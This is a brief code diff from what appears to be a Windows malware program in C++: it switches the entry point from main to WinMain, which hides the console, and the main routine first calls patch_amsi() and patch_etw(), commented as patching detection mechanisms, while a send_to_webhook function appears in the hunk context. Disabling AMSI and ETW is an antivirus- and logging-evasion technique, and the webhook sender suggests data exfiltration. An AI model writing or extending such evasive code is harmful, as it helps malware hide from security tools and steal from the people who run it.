@@ -210,7 +210,7 @@ void send_to_webhook(const std::string& content) {
 //  MAIN
 // ─────────────────────────────────────────────────────────────────────────────
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Patch detection mechanisms first
     patch_amsi();
     patch_etw();
